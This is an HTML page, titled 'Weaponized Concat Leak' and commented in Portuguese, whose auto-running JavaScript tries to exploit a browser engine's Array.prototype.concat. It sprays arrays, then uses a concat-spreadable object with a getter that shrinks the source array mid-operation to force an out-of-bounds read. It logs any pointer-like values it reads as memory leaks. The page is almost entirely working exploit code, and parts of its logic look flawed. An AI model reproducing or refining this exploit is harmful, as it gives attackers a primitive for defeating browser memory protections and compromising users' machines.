<!DOCTYPE html>
<html>
<head>
    <title>Weaponized Concat Leak</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; }
        .win { color: #0f0; font-weight: bold; font-size: 1.2em; }
    </style>
</head>
<body>
    <h2>Concat Leak: Caçando Ponteiros</h2>
    <div id="log">Iniciando...</div>

    <script>
        function log(msg, type='') {
            const el = document.getElementById('log');
            el.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // Função auxiliar para converter Double (Float64) para Hex
        const buf = new ArrayBuffer(8);
        const f64 = new Float64Array(buf);
        const u32 = new Uint32Array(buf);

        function d2h(val) {
            f64[0] = val;
            let lo = u32[0];
            let hi = u32[1];
            return `0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`;
        }

        function runExploit() {
            try {
                log("1. Preparando Spray de Objetos...");
                
                // Criamos arrays de float para serem as "vítimas" adjacentes
                // O header desses objetos contém ponteiros (StructureID / Butterfly)
                let targets = [];
                for(let i=0; i<100; i++) {
                    targets.push([1.1, 2.2, 3.3, 4.4]);
                }

                log("2. Configurando o Gatilho (Hole)...");
                let hole = {
                    length: 120, // Dizemos que vamos ler 120 itens
                    [Symbol.isConcatSpreadable]: true,
                    get 0() {
                        // O GOLPE:
                        // No momento da primeira leitura, esvaziamos o array alvo 'sprayer'
                        // e forçamos o Garbage Collector para mover coisas.
                        sprayer.length = 0; 
                        
                        // Opcional: Tentar forçar GC aqui se necessário
                        // Mas o simples resize já deve expor a memória antiga
                        return 1337.0; // Marcador
                    },
                    // Precisamos definir getters numéricos para enganar o motor se ele checar
                    get 1() { return 1337.1; } 
                };

                // O Array que será esvaziado
                // Colocamos valores float para alinhar com Doubles
                let sprayer = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]; 
                
                log("3. Disparando concat()...");
                
                // A Mágica:
                // sprayer (agora vazio) + hole (diz que tem 120) -> Leitura OOB
                let res = sprayer.concat(hole);

                log("4. Analisando resultados...");
                
                // Procuramos por valores que NÃO sejam 1.1, 2.2... nem undefined
                // E que pareçam ponteiros (valores gigantes ou específicos)
                let foundLeak = false;

                for(let i=0; i<res.length; i++) {
                    let val = res[i];
                    
                    if (val === undefined) continue;
                    if (val === 1337.0 || val === 1337.1) continue; // Nossos marcadores
                    if (val < 1000 && val > -1000) continue; // Números pequenos normais

                    // Se chegou aqui, é algo estranho!
                    let hex = d2h(val);
                    
                    // Filtro simples: Ponteiros em 64-bit userland geralmente começam com 0x0000
                    // ou 0x0008 (comprimidos/estrutura).
                    // Mas qualquer coisa que pareça um endereço é vitória.
                    
                    log(`[LEAK] Index ${i}: Valor Bruto=${val} | Hex=${hex}`, 'win');
                    foundLeak = true;
                }

                if(!foundLeak) {
                    log("Nenhum vazamento óbvio detectado nesta tentativa.");
                }

            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        setTimeout(runExploit, 1000);
    </script>
</body>
</html>

